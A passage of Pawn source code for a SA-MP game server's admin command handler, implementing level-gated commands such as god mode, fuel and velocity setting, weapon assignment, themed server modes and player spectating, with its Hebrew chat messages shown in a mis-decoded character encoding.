				vehicleinfo[v][vgm] = 0;
			}
			playerinfo[playerid][gm] = 0;
			SendClientMessage(playerid,green," .юЎс тхуюху фхЇёў");
			PlaySound(playerid,1057);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/pgodmod") && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(playerinfo[playerid][admin] < 12 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 12");
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /pgodmod [id/name] [on/off] :Ўх°· ф∙щюх∙");
		new id, v = -1, string[M_S];
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(IsPlayerInAnyVehicle(id)) v = GetPlayerVehicleID(playerid);
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /pgodmod [id/name] [on/off] :Ўх°· ф∙щюх∙");
		if(equal(cmd,"on"))
		{
			if(playerinfo[id][gm]) return SendClientMessage(playerid,red," .ью∙·ю∙ цф ыс° щ∙ тхуюху");
			SetPlayerHealth(id,INFINITY);
			if(v != -1)
			{
				SetVehicleHealth(v,10000.0);
				vehicleinfo[v][vgm] = 1;
			}
			playerinfo[id][gm] = 1;
			format(string,sizeof(string)," Х (ўщсь тхуюху (рщЁёхє чщщэ %s",GetName(id));
			SendClientMessageToAll(orange,string);
			PlaySound(playerid,1057);
		}
		else if(equal(cmd,"off"))
		{
			if(!playerinfo[id][gm]) return SendClientMessage(playerid,red," .ью∙·ю∙ цф рщя тхуюху");
			SetPlayerHealth(id,100.0);
			if(v != -1)
			{
				SetVehicleHealth(v,1000.0);
				vehicleinfo[v][vgm] = 0;
			}
			playerinfo[id][gm] = 0;
			format(string,sizeof(string)," Х (чц° ьюЎс °тщь (ььр тхуюху %s",GetName(id));
			SendClientMessageToAll(orange,string);
			PlaySound(playerid,1057);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/noreload") && IsPlayerMAdmin(playerid)) // guard_shit
	{
		cmd = strtok(cmdtext,idx);
		if(playerinfo[playerid][admin] < 12 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 12");
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /noreload [on/off] :Ўх°· ф∙щюх∙");
		if(equal(cmd,"on"))
		{
			if(IsPlayerUsingSGuard_(playerid))
			{
				if(IsGameCheatEnabled(playerid,CHEAT_NORELOAD)) return SendClientMessage(playerid,red," .р·ф ыс° сюЎс рщя шЄщЁф");
				EnableGameCheat(playerid,CHEAT_NORELOAD,true);
			}
			else
			{
				if(playerinfo[playerid][nr]) return SendClientMessage(playerid,red," .р·ф ыс° сюЎс рщя шЄщЁф");
				playerinfo[playerid][nr] = 1;
			}
			SendClientMessage(playerid,green," .юЎс рщя шЄщЁф фхЇЄь");
			PlaySound(playerid,1057);
		}
		else if(equal(cmd,"off"))
		{
			if(IsPlayerUsingSGuard_(playerid))
			{
				if(!IsGameCheatEnabled(playerid,CHEAT_NORELOAD)) return SendClientMessage(playerid,red," .р·ф ьр сюЎс рщя шЄщЁф");
				EnableGameCheat(playerid,CHEAT_NORELOAD,false);
			}
			else
			{
				if(!playerinfo[playerid][nr]) return SendClientMessage(playerid,red," .р·ф ьр сюЎс рщя шЄщЁф");
				playerinfo[playerid][nr] = 0;
			}
			SendClientMessage(playerid,green," .юЎс рщя шЄщЁф фхЇёў");
        	playerinfo[playerid][nr] = 0;
			PlaySound(playerid,1057);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/abf") && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(playerinfo[playerid][admin] < 12 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 12");
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /abf [on/off] :Ўх°· ф∙щюх∙");
		if(equal(cmd,"on"))
		{
			if(playerinfo[playerid][abf][0]) return SendClientMessage(playerid,red," .Anti Bike Fall р·ф ыс° сюЎс");
			playerinfo[playerid][abf][0] = 1;
			playerinfo[playerid][abf][1] = GetPlayerState(playerid) == PLAYER_STATE_DRIVER ? GetPlayerVehicleID(playerid) : INVALID_VEHICLE_ID;
			SendClientMessage(playerid,green," .фхЇЄь Anti Bike Fall юЎс");
			PlaySound(playerid,1057);
		}
		else if(equal(cmd,"off"))
		{
			if(!playerinfo[playerid][abf][0]) return SendClientMessage(playerid,red," .Anti Bike Fall р·ф ьр сюЎс");
			playerinfo[playerid][abf][0] = 0;
			playerinfo[playerid][abf][1] = INVALID_VEHICLE_ID;
			SendClientMessage(playerid,green," .фхЇёў Anti Bike Fall юЎс");
			PlaySound(playerid,1057);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/setfuel") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 12 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 12");
		new cmd2[M_S], id, f, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setvhealth [id/name] [fuel] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid), f = strval(cmd2);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(f < 0 || f > (playerinfo[playerid][admin] >= 18 ? 1000 : 100)) return SendClientMessage(playerid,red," .ыюх· уьў ∙тхщф");
		playerinfo[id][fuel] = f;
		format(string,sizeof(string)," .ь %d %s ∙щЁщ· р· ыюх· фуьў ∙ь",f,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .фрующя ∙щЁф р· ыюх· фуьў ∙ь ф°ыс ∙ьъ ь %d",f);
		SendClientMessage(id,green,string);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/getfuel") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 12 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 5");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getfuel [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		format(string,sizeof(string)," .фщр %d %s ыюх· фуьў ∙ь",playerinfo[id][fuel],GetName(id));
		SendClientMessage(playerid,green,string);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/getall") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 13 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 13");
		new string[M_S], Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && !IsPlayerNPC(i) && playerinfo[i][admin] < playerinfo[playerid][admin]) SetPlayerPos(i,p[0]+floatrand(-1.0,1.0),p[1]+floatrand(-1.0,1.0),p[2]);
		format(string,sizeof(string)," .∙щт° р· ыхьэ рьщх %s фрующя",GetName(playerid));
		SendClientMessageToAll(orange,string);
		return 1;
	}
	if(equal(cmd,"/setfight") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 13 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 13");
		new cmd2[M_S], id, value, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setfight [id/name] [fighting style id] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		value = strval(cmd2);
		if(!playerinfo[playerid][pp] && (value < 4 || (value > 7 && value != 15 && value != 26))) return SendClientMessage(playerid,red," .Є°ъ ∙тхщ");
		format(string,sizeof(string)," .ьёхт юёЇ° %d %s ∙щЁщ· р· ёхт фюых· ∙ь",value,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .фрующя ∙щЁф р· ёхт фюых· ∙ьъ ьёхт юёЇ° %d",value);
		SendClientMessage(id,green,string);
		SetPlayerFightingStyle(id,value);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/setskill") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 13 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 13");
		new cmd2[M_S], cmd3[M_S], id, value, s, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx), cmd3 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2) || !strlen(cmd3) || !IsNumeric(cmd3)) return SendClientMessage(playerid,white," /setskill [id/name] [skill id] [skill] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		value = strval(cmd2), s = strval(cmd3);
		if(!playerinfo[playerid][pp] && (value < 0 || value > 10)) return SendClientMessage(playerid,red," .Є°ъ ∙тхщ");
		if(!playerinfo[playerid][pp] && (s < 0 || s > 2000)) return SendClientMessage(playerid,red," .ёўщь ∙тхщ");
		format(string,sizeof(string)," .ь %d %s ∙щЁщ· р· фёўщь сЁ∙ў %d ∙ь",s,value,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .фрующя ∙щЁф р· фёўщь ∙ьъ сЁ∙ў %d ь %d",s,value);
		SendClientMessage(id,green,string);
		SetPlayerSkillLevel(playerid,value,s);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/setvelocity") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 13 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 13");
		new id, Float:p[3], t, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /setvelocity [id/name] [x] [y] [z] [type 1= + 2= - 3= =] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		for(new i=0;i<3;i++)
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsFloat(cmd)) return SendClientMessage(playerid,white," /setvelocity [id/name] [x] [y] [z] [type 1= + 2= - 3= =] :Ўх°· ф∙щюх∙");
			p[i] = floatstr(cmd);
			if(p[i] < -20000.0 || p[i] > 20000.0) return SendClientMessage(playerid,red," .ющўхэ ∙тхщ");
		}
		cmd = strtok(cmdtext,idx), t = strval(cmd);
		if(t < 1 || t > 3) return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		format(string,sizeof(string)," .ь %.4f,%.4f,%.4f %s ∙щЁщ· р· фюфщ°х· ∙ь",p[0],p[1],p[2],GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green," .фрующя ∙щЁф р· р· фюфщ°х· ∙ьъ");
		if(t == 1)
		{
			new Float:p2[3];
			GetPlayerVelocity(id,p2[0],p2[1],p2[2]);
			SetPlayerVelocity(id,p2[0] + p[0],p2[1] + p[1],p2[2] + p[2]);
		}
		else if(t == 2)
		{
			new Float:p2[3];
			GetPlayerVelocity(id,p2[0],p2[1],p2[2]);
			SetPlayerVelocity(id,p2[0] - p[0],p2[1] - p[1],p2[2] - p[2]);
		}
		else if(t == 3) SetPlayerVelocity(id,p[0],p[1],p[2]);
		return 1;
	}
	if(equal(cmd,"/setvvelocity") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 13 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 13");
		new id, Float:p[3], t, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /setvvelocity [id/name] [x] [y] [z] [type 1= + 2= - 3= =] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!IsPlayerInAnyVehicle(id)) return SendClientMessage(playerid,red," .ю∙·ю∙ цф ьр с°ыс");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		for(new i=0;i<3;i++)
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsFloat(cmd)) return SendClientMessage(playerid,white," /setvvelocity [id/name] [x] [y] [z] [type 1= + 2= - 3= =] :Ўх°· ф∙щюх∙");
			p[i] = floatstr(cmd);
			if(p[i] < -20000.0 || p[i] > 20000.0) return SendClientMessage(playerid,red," .ющўхэ ∙тхщ");
		}
		cmd = strtok(cmdtext,idx), t = strval(cmd);
		if(t < 1 || t > 3) return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		format(string,sizeof(string)," .ь %.4f,%.4f,%.4f %s ∙щЁщ· р· фюфщ°х· ∙ь",p[0],p[1],p[2],GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green," .фрующя ∙щЁф р· р· фюфщ°х· ∙ьъ");
		id = GetPlayerVehicleID(id);
		if(t == 1)
		{
			new Float:p2[3];
			GetVehicleVelocity(id,p2[0],p2[1],p2[2]);
			SetVehicleVelocity(id,p2[0] + p[0],p2[1] + p[1],p2[2] + p[2]);
		}
		else if(t == 2)
		{
			new Float:p2[3];
			GetVehicleVelocity(id,p2[0],p2[1],p2[2]);
			SetVehicleVelocity(id,p2[0] - p[0],p2[1] - p[1],p2[2] - p[2]);
		}
		else if(t == 3) SetVehicleVelocity(id,p[0],p[1],p[2]);
		return 1;
	}
	if(equal(cmd,"/setdrunk") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 13 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 13");
		new cmd2[M_S], id, value, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setdrunk [id/name] [drunk level] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		value = strval(cmd2);
		if(!playerinfo[playerid][pp] && (value < 0 || value > 10000)) return SendClientMessage(playerid,red," .Є°ъ ∙тхщ");
		format(string,sizeof(string)," .ь %d %s ∙щЁщ· р· °ю· фф∙·ы°х· ∙ь",value,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .фрующя ∙щЁф р· °ю· фф∙·ы°х· ∙ьъ ь %d",value);
		SendClientMessage(id,green,string);
		SetPlayerDrunkLevel(id,value);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/setaction") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 13 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 13");
		new cmd2[M_S], id, value, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setaction [id/name] [action id] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		value = strval(cmd2);
		if(!playerinfo[playerid][pp] && (value < 0 || value == 9 || (value > 13 && value < 20) || value > 23)) return SendClientMessage(playerid,red," .Є°ъ ∙тхщ");
		format(string,sizeof(string)," .ь %d %s ∙щЁщ· р· ф·ЁхЄф ∙ь",value,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .фрующя ∙щЁф р· ф·ЁхЄф ∙ьъ ь·ЁхЄф юёЇ° %d",value);
		SendClientMessage(id,green,string);
		SetPlayerSpecialAction(id,value);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/setarmed") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 13 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 13");
		new cmd2[M_S], id, weaponid, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2)) return SendClientMessage(playerid,white," /setarmed [id/name] [weapon id] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		weaponid = IsNumeric(cmd2) ? strval(cmd2) : GetWeaponIDFromName(cmd2);
		if((weaponid < 0 || weaponid > 46 || weaponid == 19 || weaponid == 20 || weaponid == 21) && !playerinfo[playerid][pp]) return SendClientMessage(playerid,red," .∙э Ё∙ў рх юёЇ° ∙тхщ");
		format(string,sizeof(string)," .%s ючцщў ь %s ∙щЁщ· р· фЁ∙ў ∙",WeaponName(weaponid),GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .%s фрующя ∙щЁф р· фЁ∙ў ∙р·ф ючцщў ь",WeaponName(weaponid));
		SendClientMessage(id,green,string);
		SetPlayerArmedWeapon(id,weaponid);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/setmode") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		if(strlen(modeuse) > 0) return SendClientMessage(playerid,red," .рЁр ёщщэ ўхуэ р· фюху фЁхычщ");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /setmode [grandpa/matrix/speed/police/army/israel] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," grandpa - юху ёср | matrix - юш°щўё | speed - юху уЁщ");
			return SendClientMessage(playerid,white," police - юху ю∙ш°ф | army - юху Ўср | israel - щ∙°рь");
		}
		new string[M_S];
		if(equal(cmd,"grandpa"))
		{
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && !IsPlayerNPC(i))
			{
				playerinfo[i][lastskin] = GetPlayerSkin(i);
				ResetWeapons(i);
				GiveWeapon(i,15,0);
				SetPlayerSkin(i,94);
			}
			SetGravity(0.008000);
			format(string,sizeof(string)," !фЇЄщь юху ёср %s фрующя",GetName(playerid));
		}
		else if(equal(cmd,"matrix"))
		{
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && !IsPlayerNPC(i))
			{
				playerinfo[i][lastskin] = GetPlayerSkin(i);
				ResetWeapons(i);
				GiveWeapon(i,24,100000);
				SetPlayerSkin(i,randomEx(165,167));
			}
			SetGravity(0.001000);
			format(string,sizeof(string)," !фЇЄщь юху юш°щўё %s фрующя",GetName(playerid));
		}
		else if(equal(cmd,"speed"))
		{
			new danySkins[] = {78,79,160,254};
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && !IsPlayerNPC(i))
			{
				playerinfo[i][lastskin] = GetPlayerSkin(i);
				ResetWeapons(i);
				GiveWeapon(i,randomEx(10,14),100000);
				SetPlayerSkin(i,danySkins[random(sizeof(danySkins))]);
			}
			SetGravity(0.008000);
			format(string,sizeof(string)," !фЇЄщь юху ёЇщу %s фрующя",GetName(playerid));
		}
		else if(equal(cmd,"police"))
		{
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && !IsPlayerNPC(i))
			{
				playerinfo[i][lastskin] = GetPlayerSkin(i);
				ResetWeapons(i);
				GiveWeapon(i,3,100000);
				GiveWeapon(i,22,100000);
				SetPlayerSkin(i,randomEx(280,287));
			}
			SetGravity(0.008000);
			format(string,sizeof(string)," !фЇЄщь юху ю∙ш°ф %s фрующя",GetName(playerid));
		}
		else if(equal(cmd,"army"))
		{
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && !IsPlayerNPC(i))
			{
				playerinfo[i][lastskin] = GetPlayerSkin(i);
				ResetWeapons(i);
				GiveWeapon(i,4,100000);
				GiveWeapon(i,16,100000);
				GiveWeapon(i,24,100000);
				GiveWeapon(i,31,100000);
				SetPlayerSkin(i,287);
			}
			SetGravity(0.008000);
			format(string,sizeof(string)," !фЇЄщь юху Ўср %s фрующя",GetName(playerid));
		}
		else if(equal(cmd,"israel"))
		{
			new invalids = 0;
			for(new v = 0, r = 0; v < MAX_VEHICLES; v++) if(vehicleinfo[v][vvalid])
			{
				r = random(2);
				ChangeVehicleColor(v,r ? 1 : 7,r ? 7 : 1);
				if(invalids > 0) invalids = 0;
			}
			else if(++invalids >= 50) break;
			format(string,sizeof(string)," !фЇЄщь юху щ∙°рь %s фрующя",GetName(playerid));
		}
		else return SendClientMessage(playerid,red," .юху ∙тхщ");
		SendClientMessageToAll(orange,string);
		format(modeuse,sizeof(modeuse),cmd);
		return 1;
	}
	if(equal(cmd,"/endmode") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		if(!strlen(modeuse)) return SendClientMessage(playerid,red," .рщя ∙хэ юху юхЇЄь");
		new string[M_S];
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i))
			{
				ResetWeapons(i);
				for(new ii=0;ii<10;ii++) GiveWeapon(i,playerinfo[i][weapons][ii],ii == 8 || ii == 9 ? 1 : GetAmmunationAmmo(playerinfo[i][weapons][ii])*playerinfo[i][ammo][ii]);
				SetPlayerSkin(i,playerinfo[i][lastskin]);
			}
		}
		SetGravity(0.008000);
		if(equal(modeuse,"israel")) RespawnAllVehicles(playerid);
		format(modeuse,sizeof(modeuse),"");
		format(string,sizeof(string)," .ёт° р· фюху фўщщэ %s фрующя",GetName(playerid));
		SendClientMessageToAll(orange,string);
		return 1;
	}
	if(equal(cmd,"/boomcar") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 14 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 14");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /boomcar [id/name] [on/off] :Ўх°· ф∙щюх∙");
		new toggle = 1, id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		cmd = strtok(cmdtext,idx), toggle = !equal(cmd,"off");
		playerinfo[id][boomcar] = toggle;
		SendClientMessage(playerid,green," Done.");
		SendClientMessage(id,red,toggle ? (" Are you ready to see some FIRE?!") : (" .·°тЄ, ьр ·°рф Єху р∙"));
		return 1;
	}
	if(equal(cmd,"/diehard") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 14 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 14");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /diehard [id/name] :Ўх°· ф∙щюх∙");
		new id = ReturnUser(cmd,playerid), string[M_S];
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(playerinfo[id][diehard][0]) return SendClientMessage(playerid,red," .diehard ∙чўя цф ыс° сюЎс");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		playerinfo[id][diehard][0] = 1;
		SetTimerPck(playerinfo[id][diehard][1],"DiehardPublic",200,1,"i",id);
		format(string,sizeof(string)," .diehard ьюЎс %s фыЁё· р·",GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,red," .diehard фхыЁё· ьюЎс");
		return 1;
	}
	if(equal(cmd,"/lifegood") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 14 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 14");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /lifegood [id/name] [on/off] :Ўх°· ф∙щюх∙");
		new id = ReturnUser(cmd,playerid), string[M_S];
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		cmd = strtok(cmdtext,idx);
		if(!equal(cmd,"on") && !equal(cmd,"off")) return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		if(equal(cmd,"on"))
		{
			if(playerinfo[id][lifegood][0]) return SendClientMessage(playerid,red," .∙чўя цф ыс° сюЎс ьщщє-тху");
			playerinfo[id][lifegood][0] = 1;
			SetTimerPck(playerinfo[id][lifegood][1],"LifeGoodPublic",200,1,"i",id);
			format(string,sizeof(string)," .ьюЎс ьщщє-тху %s фыЁё· р·",GetName(id));
			SendClientMessage(playerid,green,string);
			SendClientMessage(id,red," .фхыЁё· ьюЎс ьщщє-тху");
		}
		else
		{
			if(!playerinfo[id][lifegood][0]) return SendClientMessage(playerid,red," .∙чўя цф ьр сюЎс ьщщє-тху");
			playerinfo[id][lifegood][0] = 0;
			KillTimer(playerinfo[id][lifegood][1]);
			format(string,sizeof(string)," .ююЎс ьщщє-тху %s фхЎр· р·",GetName(id));
			SendClientMessage(playerid,green,string);
			SendClientMessage(id,red," .фхЎр· ююЎс ьщщє-тху");
		}
		return 1;
	}
	if(equal(cmd,"/pspec") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 14 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 14");
		new id, string[M_S], mode;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /pspec [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		cmd = strtok(cmdtext,idx), mode = !strlen(cmd) || !IsNumeric(cmd) ? SPECTATE_MODE_NORMAL : strval(cmd);
		SavePlayerPos(id);
 		TogglePlayerSpectating(id,1);
 		if(IsPlayerInAnyVehicle(playerid)) PlayerSpectateVehicle(id,GetPlayerVehicleID(playerid),mode);
 		else PlayerSpectatePlayer(id,playerid,mode);
 		SetPlayerInterior(id,GetPlayerInterior(playerid));
 		SetPlayerVirtualWorld(id,GetPlayerVirtualWorld(playerid));
 		playerinfo[id][spectate] = playerid;
		format(string,sizeof(string)," .сюЄўс Єьщъ %s ыЄ·",GetName(id));
		SendClientMessage(playerid,yellow,string);
		format(string,sizeof(string)," /soff :рщЇ∙° ьъ ьЄўхс рч°щх. ьфЇёў· фюЄўс %s фрующя",GetName(playerid));
		SendClientMessage(id,yellow,string);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/pspecoff") && IsPlayerMAdmin(playerid))
	{
